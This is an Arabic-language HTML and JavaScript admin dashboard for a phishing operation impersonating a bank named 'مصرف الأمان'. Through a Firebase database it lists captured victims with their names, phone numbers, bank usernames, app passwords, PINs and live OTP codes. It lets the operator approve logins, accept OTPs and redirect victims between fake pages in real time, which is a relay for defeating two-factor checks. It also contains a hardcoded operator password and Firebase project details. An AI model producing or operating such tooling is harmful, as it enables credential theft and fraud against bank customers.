<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>لوحة التحكم - مصرف الأمان</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family:'Cairo','Janna LT',Arial,sans-serif; }

    :root {
      --primary: #0058b0;
      --primary-dark: #003d7a;
      --primary-light: #1a6fc4;
      --primary-bg: #e8f0fb;
      --bg: #f4f6fa;
      --bg-card: #ffffff;
      --border: #c5d5ea;
      --text: #1a2636;
      --text-sub: #5a6a7a;
      --white: #ffffff;
      --red: #c62828;
      --orange: #e65100;
      --green: #1b7a2e;
      --shadow: 0 2px 12px rgba(0,88,176,0.10);
    }

    body { background: var(--bg); color: var(--text); min-height: 100vh; }

    /* ===== LOGO ===== */
    .bank-logo {
      width: 40px; height: 40px;
      background: rgba(255,255,255,0.95);
      border-radius: 10px;
      display: flex; align-items: center; justify-content: center;
      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
      flex-shrink: 0;
    }
    .login-logo {
      width: 80px; height: 80px;
      background: var(--primary-bg);
      border-radius: 22px;
      display: flex; align-items: center; justify-content: center;
      margin: 0 auto 16px;
      box-shadow: 0 4px 16px rgba(0,88,176,0.15);
    }

    /* ===== LOGIN ===== */
    #loginScreen {
      min-height: 100vh; display: flex; align-items: center; justify-content: center;
      background: linear-gradient(160deg, var(--primary-dark) 0%, var(--primary) 60%, var(--primary-light) 100%);
    }
    .login-box {
      background: var(--white); border-radius: 18px;
      padding: 40px 32px; width: 340px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.25); text-align: center;
    }
    .login-box h2 { color: var(--primary); font-size: 20px; margin-bottom: 4px; }
    .login-box .login-sub { color: var(--text-sub); font-size: 13px; margin-bottom: 24px; }
    .login-box input {
      width: 100%; padding: 11px 14px;
      border: 1.5px solid var(--border); border-radius: 10px;
      font-size: 14px; margin-bottom: 14px;
      outline: none; text-align: right; transition: border-color 0.2s;
    }
    .login-box input:focus { border-color: var(--primary); }
    .login-box button {
      width: 100%; padding: 12px; background: var(--primary); color: #fff;
      border: none; border-radius: 10px; font-size: 15px; font-weight: 800; cursor: pointer;
    }
    .login-box button:hover { background: var(--primary-dark); }
    .login-error { color: var(--red); font-size: 13px; margin-top: 10px; display: none; }

    /* ===== DASHBOARD ===== */
    #dashboard { display: none; min-height: 100vh; }

    /* HEADER */
    .header {
      background: var(--primary); color: #fff;
      padding: 0 24px; height: 58px;
      display: flex; align-items: center; justify-content: space-between;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      position: sticky; top: 0; z-index: 100;
    }
    .header-left { display: flex; align-items: center; gap: 12px; }
    .header h1 { font-size: 17px; font-weight: 900; }
    .header-badge {
      background: rgba(255,255,255,0.15); border-radius: 20px;
      padding: 4px 12px; font-size: 12px;
      display: flex; align-items: center; gap: 6px;
    }
    .dot-live {
      width: 8px; height: 8px; background: #69f0ae;
      border-radius: 50%; animation: pulse 1.5s infinite;
    }
    @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(1.3)} }
    .header-right { display: flex; align-items: center; gap: 10px; }
    .btn-logout {
      background: rgba(255,255,255,0.15); border: none; color: #fff;
      padding: 6px 14px; border-radius: 8px; font-size: 13px; cursor: pointer;
    }
    .btn-logout:hover { background: rgba(255,255,255,0.25); }
    .btn-clear-all {
      background: var(--red); border: none; color: #fff;
      padding: 6px 14px; border-radius: 8px; font-size: 13px; cursor: pointer; font-weight: 700;
    }
    .btn-clear-all:hover { background: #b71c1c; }

    /* STATS */
    .stats-bar {
      background: var(--white); border-bottom: 1px solid #e0e0e0;
      padding: 10px 24px; display: flex; gap: 20px;
    }
    .stat-item { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--text-sub); }
    .stat-num { font-weight: 900; font-size: 16px; color: var(--primary); }
    .stat-num.red { color: var(--red); }
    .stat-num.orange { color: var(--orange); }

    /* LAYOUT */
    .layout { display: grid; grid-template-columns: 280px 1fr; height: calc(100vh - 98px); }

    /* SIDEBAR */
    .sidebar { background: var(--white); border-left: 1px solid #e0e0e0; overflow-y: auto; }
    .sidebar-header {
      padding: 14px 16px; font-size: 13px; font-weight: 800;
      color: var(--primary); border-bottom: 1px solid #e0e0e0;
      background: var(--bg-card); position: sticky; top: 0;
    }

    .visitor-item {
      padding: 12px 14px; border-bottom: 1px solid #f0f0f0;
      cursor: pointer; transition: background 0.15s; position: relative;
    }
    .visitor-item:hover { background: #f0f4ff; }
    .visitor-item.active { background: var(--primary-bg); border-right: 3px solid var(--primary); }
    .visitor-item.has-action { background: #fff8f0; }
    .visitor-item.has-action.active { background: #fff3e0; }

    .vi-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 4px; }
    .vi-name { font-size: 14px; font-weight: 800; color: var(--text); }
    .vi-time { font-size: 11px; color: var(--text-sub); }
    .vi-phone { font-size: 12px; color: var(--text-sub); margin-bottom: 4px; }
    .vi-page { font-size: 11px; color: var(--primary); font-weight: 600; }

    .vi-status {
      display: inline-flex; align-items: center; gap: 4px;
      font-size: 11px; font-weight: 700;
      padding: 2px 8px; border-radius: 10px; margin-top: 4px;
    }
    .vi-status.waiting  { background: #fff3e0; color: var(--orange); }
    .vi-status.approved { background: #e3f2fd; color: #1565c0; }
    .vi-status.otp      { background: #f3e5f5; color: #6a1b9a; }
    .vi-status.done     { background: #e8f5e9; color: var(--green); }
    .vi-status.rejected { background: #fdecea; color: var(--red); }

    .action-badge {
      position: absolute; top: 10px; left: 10px;
      background: var(--orange); color: #fff;
      font-size: 10px; font-weight: 900;
      padding: 2px 7px; border-radius: 10px;
      animation: blink 1s infinite;
    }
    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }

    /* MAIN PANEL */
    .main-panel { padding: 20px; overflow-y: auto; background: var(--bg); }
    .empty-state {
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      height: 100%; color: var(--text-sub); gap: 12px;
    }
    .empty-state .icon { font-size: 52px; }
    .empty-state p { font-size: 15px; }

    /* VISITOR BOX */
    .visitor-box {
      background: var(--white); border-radius: 16px;
      box-shadow: var(--shadow); overflow: hidden; max-width: 700px;
    }
    .vb-header {
      background: linear-gradient(135deg, var(--primary-dark), var(--primary));
      color: #fff; padding: 18px 22px;
      display: flex; align-items: center; justify-content: space-between;
    }
    .vb-header-left h2 { font-size: 20px; font-weight: 900; margin-bottom: 4px; color: #fff !important; }
    .vb-header-left .vb-page { font-size: 12px; opacity: 0.85; }
    .vb-time { font-size: 12px; opacity: 0.8; }
    .status-dot {
      display: inline-block; width: 10px; height: 10px;
      border-radius: 50%; margin-left: 6px; vertical-align: middle;
    }
    .status-dot.online  { background: #22c55e; box-shadow: 0 0 6px #22c55e; }
    .status-dot.offline { background: #9ca3af; }

    .vb-body { padding: 20px 22px; }

    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 18px; }
    .info-item { background: var(--bg); border-radius: 10px; padding: 12px 14px; }
    .info-item .label { font-size: 11px; color: var(--text-sub); font-weight: 700; margin-bottom: 4px; }
    .info-item .value { font-size: 15px; font-weight: 800; color: var(--text); word-break: break-all; }
    .info-item.full { grid-column: 1 / -1; }

    .status-badge {
      display: inline-flex; align-items: center; gap: 6px;
      padding: 6px 14px; border-radius: 20px; font-size: 13px; font-weight: 800;
    }
    .status-badge.waiting        { background: #fff3e0; color: var(--orange); }
    .status-badge.approved       { background: #e3f2fd; color: #1565c0; }
    .status-badge.otp_submitted  { background: #f3e5f5; color: #6a1b9a; }
    .status-badge.final_approved { background: #e8f5e9; color: var(--green); }
    .status-badge.final_rejected,
    .status-badge.rejected       { background: #fdecea; color: var(--red); }

    .actions-section { border-top: 1px solid #f0f0f0; padding-top: 16px; margin-top: 4px; }
    .actions-title { font-size: 13px; font-weight: 800; color: var(--text-sub); margin-bottom: 12px; }
    .action-group { margin-bottom: 14px; }
    .action-group-label { font-size: 12px; color: var(--text-sub); margin-bottom: 8px; font-weight: 700; }
    .btn-row { display: flex; gap: 10px; flex-wrap: wrap; }

    .btn-approve {
      flex: 1; padding: 11px; background: var(--primary); color: #fff;
      border: none; border-radius: 10px; font-size: 14px; font-weight: 800; cursor: pointer;
      transition: background 0.2s;
    }
    .btn-approve:hover { background: var(--primary-dark); }
    .btn-reject {
      flex: 1; padding: 11px; background: var(--red); color: #fff;
      border: none; border-radius: 10px; font-size: 14px; font-weight: 800; cursor: pointer;
      transition: background 0.2s;
    }
    .btn-reject:hover { background: #b71c1c; }
    .btn-delete {
      width: 100%; padding: 10px; background: #fff; color: var(--red);
      border: 1.5px solid var(--red); border-radius: 10px;
      font-size: 13px; font-weight: 800; cursor: pointer; margin-top: 10px; transition: all 0.2s;
    }
    .btn-delete:hover { background: #fdecea; }

    /* REDIRECT */
    .redirect-section {
      background: var(--bg); border: 1.5px solid var(--border);
      border-radius: 12px; padding: 14px 16px; margin-bottom: 14px;
    }
    .redirect-section label {
      font-size: 13px; font-weight: 800; color: var(--primary); display: block; margin-bottom: 8px;
    }
    .redirect-row { display: flex; gap: 8px; }
    .redirect-select {
      flex: 1; padding: 9px 12px; border: 1.5px solid var(--border);
      border-radius: 8px; font-size: 13px; outline: none;
      background: var(--white); color: var(--text);
    }
    .btn-redirect {
      padding: 9px 16px; background: var(--primary); color: #fff;
      border: none; border-radius: 8px; font-size: 13px; font-weight: 800; cursor: pointer;
    }
    .btn-redirect:hover { background: var(--primary-dark); }

    /* OTP DISPLAY */
    .otp-display {
      background: #f3e5f5; border: 1.5px solid #ce93d8;
      border-radius: 12px; padding: 14px 16px; margin-bottom: 14px; display: none;
    }
    .otp-display.show { display: block; }
    .otp-display .otp-label { font-size: 12px; color: #6a1b9a; font-weight: 700; margin-bottom: 6px; }
    .otp-display .otp-value {
      font-size: 28px; font-weight: 900; color: #4a148c;
      letter-spacing: 8px; text-align: center; padding: 8px 0;
    }

    /* HISTORY */
    .history-section { margin-top: 16px; border-top: 1px solid #f0f0f0; padding-top: 14px; }
    .history-title { font-size: 13px; font-weight: 800; color: var(--text-sub); margin-bottom: 10px; }
    .history-item { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 8px; font-size: 12px; }
    .history-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--primary); margin-top: 3px; flex-shrink: 0; }
    .history-dot.red    { background: var(--red); }
    .history-dot.orange { background: var(--orange); }
    .history-dot.purple { background: #6a1b9a; }
    .history-text { color: var(--text); }
    .history-time { color: var(--text-sub); margin-right: auto; }

    /* TOAST */
    .toast-container { position: fixed; top: 70px; left: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 8px; }
    .toast {
      background: var(--primary); color: #fff;
      padding: 12px 18px; border-radius: 12px; font-size: 13px; font-weight: 700;
      box-shadow: 0 4px 20px rgba(0,0,0,0.25);
      display: flex; align-items: center; gap: 10px;
      animation: slideIn 0.3s ease; max-width: 300px;
    }
    .toast.action { background: var(--orange); }
    @keyframes slideIn { from{transform:translateX(-100%);opacity:0} to{transform:translateX(0);opacity:1} }

    ::-webkit-scrollbar { width: 5px; }
    ::-webkit-scrollbar-track { background: #f0f0f0; }
    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }

    /* CLEAR CHAT */
    .btn-clear-chat {
      background: #ff9800; color: #fff; border: none; border-radius: 8px;
      padding: 9px 18px; font-size: 14px; cursor: pointer;
      margin-top: 8px; width: 100%; transition: background 0.2s;
    }
    .btn-clear-chat:hover { background: var(--orange); }
    .clear-chat-menu {
      display: none; position: absolute; background: var(--white);
      border: 1px solid var(--border); border-radius: 8px;
      box-shadow: 0 4px 16px rgba(0,0,0,0.15);
      z-index: 999; min-width: 200px; overflow: hidden; right: 0;
    }
    .clear-chat-menu.open { display: block; }
    .clear-chat-menu button {
      display: block; width: 100%; padding: 12px 16px;
      background: none; border: none; text-align: right;
      font-size: 14px; cursor: pointer; color: #333; transition: background 0.15s;
    }
    .clear-chat-menu button:hover { background: var(--bg); }
    .clear-chat-menu button.danger { color: #d32f2f; }

    .visitor-item .vi-checkbox {
      display: none; margin-left: 8px; width: 18px; height: 18px;
      cursor: pointer; accent-color: #4caf50; flex-shrink: 0; vertical-align: middle;
    }
    body.selection-mode .visitor-item .vi-checkbox { display: inline-block; }
    body.selection-mode .visitor-item { cursor: default; }
    .selection-toolbar {
      display: none; padding: 10px 14px; background: #fff3e0;
      border-bottom: 1px solid #ffcc80;
      align-items: center; justify-content: space-between; gap: 8px;
    }
    body.selection-mode .selection-toolbar { display: flex; }
    .selection-toolbar span { font-size: 13px; color: var(--orange); font-weight: 600; }
    .selection-toolbar button { border: none; border-radius: 6px; padding: 6px 12px; font-size: 13px; cursor: pointer; }
    .btn-sel-delete { background: #d32f2f; color: #fff; }
    .btn-sel-cancel  { background: var(--border); color: #333; }
  </style>
</head>

<div class="toast-container" id="toastContainer"></div>

<!-- ===== LOGIN ===== -->
<div id="loginScreen">
  <div class="login-box">
    <!-- شعار في صفحة اللوجين -->
    <div class="login-logo">
      <svg width="50" height="50" viewBox="0 0 100 100"><use href="#bank-icon-blue"/></svg>
    </div>
    <h2>لوحة التحكم</h2>
    <p class="login-sub">مصرف الأمان</p>
    <input type="text" id="adminUser" placeholder="اسم المستخدم"/>

    <div class="login-error" id="loginError">❌ بيانات غير صحيحة</div>
  </div>
</div>

<!-- ===== DASHBOARD ===== -->
<div id="dashboard">
  <div class="header">
    <div class="header-left">
      <!-- شعار في الهيدر -->
      <div class="bank-logo">
        <svg width="26" height="26" viewBox="0 0 100 100"><use href="#bank-icon-white"/></svg>
      </div>
      <h1>مصرف الأمان - لوحة التحكم</h1>
      <div class="header-badge">
        <div class="dot-live"></div>
        <span>متصل</span>
      </div>
    </div>
    <div class="header-right">
      <button class="btn-clear-all" onclick="clearAllSessions()">🗑 مسح الكل</button>
      <button class="btn-logout" onclick="doLogout()">خروج</button>
    </div>
  </div>

  <div class="stats-bar">
    <div class="stat-item"><span>إجمالي الزوار:</span><span class="stat-num" id="statTotal">0</span></div>
    <div class="stat-item"><span>ينتظرون:</span><span class="stat-num orange" id="statWaiting">0</span></div>
    <div class="stat-item"><span>مكتملون:</span><span class="stat-num" id="statDone">0</span></div>
    <div class="stat-item"><span>مرفوضون:</span><span class="stat-num red" id="statRejected">0</span></div>
  </div>

  <div class="layout">
    <div class="sidebar">
      <div class="sidebar-header">📋 قائمة الزوار</div>
      <div class="selection-toolbar">
        <span id="selCount">0 محدد</span>
        <div style="display:flex;gap:6px;">
          <button class="btn-sel-delete" onclick="deleteSelected()">🗑 حذف المحدد</button>
          <button class="btn-sel-cancel" onclick="cancelSelection()">❌ إلغاء</button>
        </div>
      </div>
      <div id="visitorList"></div>
    </div>

    <div class="main-panel" id="mainPanel">
      <div class="empty-state">
        <div class="icon">👥</div>
        <p>اختر زائراً من القائمة لعرض تفاصيله</p>
      </div>
    </div>
  </div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
  import { getDatabase, ref, onValue, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

  const firebaseConfig = {

    authDomain: "masrfamanly.firebaseapp.com",

    storageBucket: "masrfamanly.firebasestorage.app",
    messagingSenderId: "168583725379",
    appId: "1:168583725379:web:a9ac2bbf45549e241caff6",

  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  const PAGES = [
    { value: 'landing',     label: 'صفحة البداية' },
    { value: 'personal',    label: 'المعلومات الشخصية' },
    { value: 'login',       label: 'بيانات التطبيق' },
    { value: 'otp',         label: 'رمز التحقق' },
    { value: 'success',     label: 'صفحة النجاح' },
    { value: 'error',       label: 'صفحة الخطأ' },
  ];

  let sessions = {};
  let selectedId = null;
  let knownIds = new Set();
  let knownStatuses = {};

  function playSound(type) {
    try {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain); gain.connect(ctx.destination);
      if (type === 'new') {
        osc.frequency.setValueAtTime(880, ctx.currentTime);
        osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
        gain.gain.setValueAtTime(0.3, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
        osc.start(ctx.currentTime); osc.stop(ctx.currentTime + 0.4);
      } else {
        osc.frequency.setValueAtTime(660, ctx.currentTime);
        osc.frequency.setValueAtTime(880, ctx.currentTime + 0.15);
        gain.gain.setValueAtTime(0.3, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
        osc.start(ctx.currentTime); osc.stop(ctx.currentTime + 0.5);
      }
    } catch(e) {}
  }

  function showToast(msg, type = 'new') {
    const container = document.getElementById('toastContainer');
    const toast = document.createElement('div');
    toast.className = `toast ${type === 'action' ? 'action' : ''}`;
    toast.innerHTML = `${type === 'new' ? '🔔' : '⚡'} ${msg}`;
    container.appendChild(toast);
    setTimeout(() => toast.remove(), 4000);
  }

  function statusLabel(s) {
    const map = {
      waiting:        ['⏳ انتظار', 'waiting'],
      approved:       ['✅ موافق على الدخول', 'approved'],
      rejected:       ['❌ مرفوض', 'rejected'],
      otp_submitted:  ['🔢 أدخل OTP', 'otp'],
      final_approved: ['🎉 مكتمل', 'done'],
      final_rejected: ['❌ OTP مرفوض', 'rejected'],
    };
    return map[s] || [s, 'waiting'];
  }

  function pageLabel(p) {
    const map = {
      landing: 'صفحة البداية', personal: 'المعلومات الشخصية',
      login: 'بيانات التطبيق', otp: 'رمز التحقق',
      success: 'صفحة النجاح', error: 'صفحة الخطأ',
      waiting: 'انتظار التحقق', 'otp-waiting': 'انتظار OTP',
    };
    return map[p] || p || 'غير معروف';
  }

  function formatTime(ts) {
    if (!ts) return '';
    return new Date(ts).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
  }

  function renderSidebar() {
    const list = document.getElementById('visitorList');
    const sorted = Object.entries(sessions).sort((a, b) => {
      const aA = ['waiting','otp_submitted'].includes(a[1].status);
      const bA = ['waiting','otp_submitted'].includes(b[1].status);
      if (aA && !bA) return -1; if (!aA && bA) return 1;
      return (b[1].lastAction||b[1].timestamp||0) - (a[1].lastAction||a[1].timestamp||0);
    });

    list.innerHTML = '';
    sorted.forEach(([id, data], idx) => {
      const [label, cls] = statusLabel(data.status);
      const hasAction = ['waiting','otp_submitted'].includes(data.status);
      const div = document.createElement('div');
      div.className = `visitor-item ${selectedId===id?'active':''} ${hasAction?'has-action':''}`;
      div.innerHTML = `
        ${hasAction ? '<div class="action-badge">يحتاج رد</div>' : ''}
        <div class="vi-top">
          <div class="vi-name">${data.name||'زائر #'+(idx+1)}</div>
          <div class="vi-time">${formatTime(data.lastAction||data.timestamp)}</div>
        </div>
        <div class="vi-phone">${data.personalPhone||data.phone||'---'}</div>
        <div class="vi-page">📍 ${pageLabel(data.currentPage)}</div>
        <div><span class="vi-status ${cls}">${label}</span></div>
      `;
      const cb = document.createElement('input');
      cb.type = 'checkbox'; cb.className = 'vi-checkbox'; cb.dataset.id = id;
      cb.onclick = (e) => { e.stopPropagation(); updateSelCount(); };
      div.insertBefore(cb, div.firstChild);
      div.onclick = (e) => {
        if (document.body.classList.contains('selection-mode')) {
          cb.checked = !cb.checked; updateSelCount();
        } else { selectVisitor(id); }
      };
      list.appendChild(div);
    });

    const all = Object.values(sessions);
    document.getElementById('statTotal').textContent = all.length;
    document.getElementById('statWaiting').textContent = all.filter(s=>['waiting','otp_submitted'].includes(s.status)).length;
    document.getElementById('statDone').textContent = all.filter(s=>s.status==='final_approved').length;
    document.getElementById('statRejected').textContent = all.filter(s=>['rejected','final_rejected'].includes(s.status)).length;
  }

  window.selectVisitor = function(id) {
    selectedId = id; renderSidebar(); renderDetail(id);
  }

  function renderDetail(id) {
    const data = sessions[id];
    if (!data) return;
    const panel = document.getElementById('mainPanel');
    const [statusText, statusCls] = statusLabel(data.status);
    const showOTP = data.status === 'otp_submitted' && data.otp && data.otp !== '---';
    const history = data.history || [];
    const isOnline = (Date.now() - (data.lastAction||data.timestamp)) < 30000;

    const historyHTML = history.slice().reverse().map(h => {
      const dotCls = h.type==='reject'?'red':h.type==='action'?'orange':h.type==='otp'?'purple':'';
      return `<div class="history-item">
        <div class="history-dot ${dotCls}"></div>
        <div class="history-text">${h.msg}</div>
        <div class="history-time">${formatTime(h.ts)}</div>
      </div>`;
    }).join('');

    const pagesOptions = PAGES.map(p=>`<option value="${p.value}">${p.label}</option>`).join('');

    panel.innerHTML = `
      <div class="visitor-box">
        <div class="vb-header">
          <div class="vb-header-left">
            <h2 style="display:flex;align-items:center;gap:6px;">
              ${data.name||'زائر'}
              <span class="status-dot ${isOnline?'online':'offline'}"></span>
            </h2>
            <div class="vb-page">📍 ${pageLabel(data.currentPage)}</div>
          </div>
          <div>
            <div class="vb-time">🕐 ${formatTime(data.timestamp)}</div>
            <div style="margin-top:6px;font-size:11px;opacity:0.85;background:rgba(255,255,255,0.15);border-radius:6px;padding:3px 8px;text-align:center;">
              ${isOnline ? '🟢 متصل الآن' : '⚫ غير متصل'}
            </div>
          </div>
        </div>

        <div class="vb-body">
          <div class="info-grid">
            <div class="info-item"><div class="label">الاسم</div><div class="value">${data.name||'---'}</div></div>
            <div class="info-item"><div class="label">رقم الهاتف</div><div class="value">${data.personalPhone||'---'}</div></div>
            <div class="info-item"><div class="label">اسم المصرف</div><div class="value">${data.bankName||'---'}</div></div>
            <div class="info-item"><div class="label">اسم المستخدم</div><div class="value">${data.phone||'---'}</div></div>
            <div class="info-item"><div class="label">كلمة مرور التطبيق</div><div class="value">${data.pin||'---'}</div></div>
            <div class="info-item"><div class="label">الرقم السري BIN</div><div class="value">${data.bin||'---'}</div></div>
            <div class="info-item"><div class="label">الحالة</div><div class="value"><span class="status-badge ${statusCls}">${statusText}</span></div></div>
            <div class="info-item"><div class="label">الصفحة الحالية</div><div class="value">${pageLabel(data.currentPage)}</div></div>
          </div>

          <div class="otp-display ${showOTP?'show':''}">
            <div class="otp-label">🔢 رمز التحقق المُدخل من الزائر:</div>
            <div class="otp-value">${data.otp||'---'}</div>
          </div>

          <div class="redirect-section">
            <label>🔀 إعادة توجيه الزائر إلى:</label>
            <div class="redirect-row">
              <select class="redirect-select" id="redirectSelect">
                <option value="">-- اختر الصفحة --</option>
                ${pagesOptions}
              </select>
              <button class="btn-redirect" onclick="redirectVisitor('${id}')">توجيه ←</button>
            </div>
          </div>

          <div class="actions-section">
            <div class="actions-title">⚡ الإجراءات</div>
            ${data.status === 'waiting' ? `
            <div class="action-group">
              <div class="action-group-label">مرحلة تسجيل الدخول:</div>
              <div class="btn-row">
                <button class="btn-approve" onclick="approveLogin('${id}')">✅ قبول الدخول</button>
                <button class="btn-reject" onclick="rejectLogin('${id}')">❌ رفض الدخول</button>
              </div>
            </div>` : ''}
            ${data.status === 'otp_submitted' ? `
            <div class="action-group">
              <div class="action-group-label">مرحلة رمز التحقق:</div>
              <div class="btn-row">
                <button class="btn-approve" onclick="approveOTP('${id}')">✅ قبول الرمز</button>
                <button class="btn-reject" onclick="rejectOTP('${id}')">❌ رفض الرمز</button>
              </div>
            </div>` : ''}
            <button class="btn-delete" onclick="deleteSession('${id}')">🗑 حذف هذه الجلسة</button>
            <div style="position:relative;margin-top:4px;">
              <button class="btn-clear-chat" onclick="toggleClearMenu(event,'${id}')">🧹 مسح المحادثات</button>
              <div class="clear-chat-menu" id="clearMenu_${id}">
                <button class="danger" onclick="clearAllChats('${id}')">🗑 مسح جميع المحادثات</button>
                <button onclick="enterSelectionMode()">☑️ حدد المحادثات</button>
              </div>
            </div>
          </div>

          ${history.length > 0 ? `
          <div class="history-section">
            <div class="history-title">📜 سجل الإجراءات</div>
            ${historyHTML}
          </div>` : ''}
        </div>
      </div>
    `;
  }

  // ✅ أزرار الموافقة والرفض - update واحد
  window.approveLogin = function(id) {
    update(ref(db, `site1/sessions/${id}`), {
      status: 'approved', lastAction: Date.now(),
      history: [...(sessions[id]?.history||[]), {msg:'تم قبول تسجيل الدخول',type:'approve',ts:Date.now()}]
    }).then(() => showToast('تم قبول تسجيل الدخول ✅', 'action'));
  }
  window.rejectLogin = function(id) {
    update(ref(db, `site1/sessions/${id}`), {
      status: 'rejected', lastAction: Date.now(),
      history: [...(sessions[id]?.history||[]), {msg:'تم رفض تسجيل الدخول',type:'reject',ts:Date.now()}]
    }).then(() => showToast('تم رفض تسجيل الدخول ❌', 'action'));
  }
  window.approveOTP = function(id) {
    update(ref(db, `site1/sessions/${id}`), {
      status: 'final_approved', lastAction: Date.now(),
      history: [...(sessions[id]?.history||[]), {msg:'تم قبول رمز التحقق',type:'approve',ts:Date.now()}]
    }).then(() => showToast('تم قبول رمز التحقق ✅', 'action'));
  }
  window.rejectOTP = function(id) {
    update(ref(db, `site1/sessions/${id}`), {
      status: 'final_rejected', lastAction: Date.now(),
      history: [...(sessions[id]?.history||[]), {msg:'تم رفض رمز التحقق',type:'reject',ts:Date.now()}]
    }).then(() => showToast('تم رفض رمز التحقق ❌', 'action'));
  }

  window.redirectVisitor = function(id) {
    const sel = document.getElementById('redirectSelect');
    const page = sel.value;
    if (!page) { alert('يرجى اختيار الصفحة أولاً'); return; }
    update(ref(db, `site1/sessions/${id}`), {
      redirectTo: page, lastAction: Date.now(),
      history: [...(sessions[id]?.history||[]), {msg:`تم توجيه الزائر إلى: ${pageLabel(page)}`,type:'action',ts:Date.now()}]
    }).then(() => { showToast(`تم توجيه الزائر إلى ${pageLabel(page)} 🔀`, 'action'); sel.value = ''; });
  }

  window.deleteSession = function(id) {
    if (!confirm('هل تريد حذف هذه الجلسة؟')) return;
    remove(ref(db, `site1/sessions/${id}`));
    if (selectedId === id) {
      selectedId = null;
      document.getElementById('mainPanel').innerHTML = `<div class="empty-state"><div class="icon">👥</div><p>اختر زائراً من القائمة لعرض تفاصيله</p></div>`;
    }
  }

  window.clearAllSessions = function() {
    if (!confirm('هل تريد مسح جميع الجلسات؟')) return;
    remove(ref(db, 'site1/sessions'));
    selectedId = null; sessions = {};
    document.getElementById('mainPanel').innerHTML = `<div class="empty-state"><div class="icon">👥</div><p>اختر زائراً من القائمة لعرض تفاصيله</p></div>`;
  }

  function startListening() {
    onValue(ref(db, 'site1/sessions'), (snap) => {
      const data = snap.val() || {};
      Object.keys(data).forEach(id => {
        if (!knownIds.has(id)) {
          knownIds.add(id);
          if (knownIds.size > 1) {
            playSound('new');
            showToast(`زائر جديد: ${data[id].name||data[id].phone||'مجهول'}`, 'new');
          }
        }
        if (knownStatuses[id] && knownStatuses[id] !== data[id].status) {
          if (['waiting','otp_submitted'].includes(data[id].status)) {
            playSound('action');
            showToast(`${data[id].name||'زائر'}: ${statusLabel(data[id].status)[0]}`, 'action');
          }
        }
        knownStatuses[id] = data[id].status;
      });
      sessions = data;
      renderSidebar();
      if (selectedId && sessions[selectedId]) renderDetail(selectedId);
    });
  }

  window.doLogin = function() {
    const u = document.getElementById('adminUser').value;
    const p = document.getElementById('adminPass').value;
    if (u === 'admin' && p === 'bb2023bb') {
      document.getElementById('loginScreen').style.display = 'none';
      document.getElementById('dashboard').style.display = 'block';
      startListening();
    } else {
      document.getElementById('loginError').style.display = 'block';
    }
  }

  window.doLogout = function() {
    document.getElementById('dashboard').style.display = 'none';
    document.getElementById('loginScreen').style.display = 'flex';
    sessions = {}; knownIds = new Set(); knownStatuses = {};
  }

  window.toggleClearMenu = function(e, id) {
    e.stopPropagation();
    document.querySelectorAll('.clear-chat-menu').forEach(m => { if (m.id !== 'clearMenu_'+id) m.classList.remove('open'); });
    document.getElementById('clearMenu_'+id)?.classList.toggle('open');
  }
  document.addEventListener('click', () => {
    document.querySelectorAll('.clear-chat-menu').forEach(m => m.classList.remove('open'));
  });

  window.clearAllChats = function(sessionId) {
    if (!confirm('هل أنت متأكد من مسح جميع المحادثات؟')) return;
    remove(ref(db, 'site1/sessions/'+sessionId+'/messages')).then(() => {
      document.querySelectorAll('.clear-chat-menu').forEach(m => m.classList.remove('open'));
      renderDetail(sessionId);
    });
  }

  window.enterSelectionMode = function() {
    document.body.classList.add('selection-mode');
    document.querySelectorAll('.clear-chat-menu').forEach(m => m.classList.remove('open'));
    updateSelCount();
  }
  window.cancelSelection = function() {
    document.body.classList.remove('selection-mode');
    document.querySelectorAll('.vi-checkbox').forEach(cb => cb.checked = false);
  }
  function updateSelCount() {
    const count = document.querySelectorAll('.vi-checkbox:checked').length;
    const el = document.getElementById('selCount');
    if (el) el.textContent = count + ' محدد';
  }
  window.deleteSelected = function() {
    const checked = document.querySelectorAll('.vi-checkbox:checked');
    if (!checked.length) { alert('لم تحدد أي جلسة'); return; }
    if (!confirm('هل أنت متأكد من حذف '+checked.length+' جلسة؟')) return;
    Promise.all([...checked].map(cb => remove(ref(db,'site1/sessions/'+cb.dataset.id))))
      .then(() => window.cancelSelection());
  }
</script>
</body>
</html>
